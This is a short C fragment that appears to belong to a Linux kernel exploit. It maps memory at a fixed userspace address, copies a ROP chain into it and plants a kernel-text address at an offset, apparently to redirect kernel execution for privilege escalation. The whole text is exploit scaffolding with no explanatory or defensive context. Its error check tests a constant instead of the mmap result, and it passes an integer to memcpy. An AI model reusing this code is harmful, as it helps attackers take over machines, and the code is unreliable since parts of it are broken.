#define userspace_base_to_map 0xfacea000

void * userspace_base;
void mmap_userspace_base(){
    userspace_base = mmap((void *)userspace_base_to_map-0x1000, 0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if (userspace_base_to_map<0){
        perror("mmap failed");
    }
}

void init_userspace_base(){
    mmap_userspace_base();
    rop_chain[10]=userspace_base_to_map + 0x3000;
    memcpy(userspace_base_to_map, rop_chain, sizeof(rop_chain));
    *(unsigned long*)(userspace_base_to_map + 0x78)=0xffffffff81707868;
}
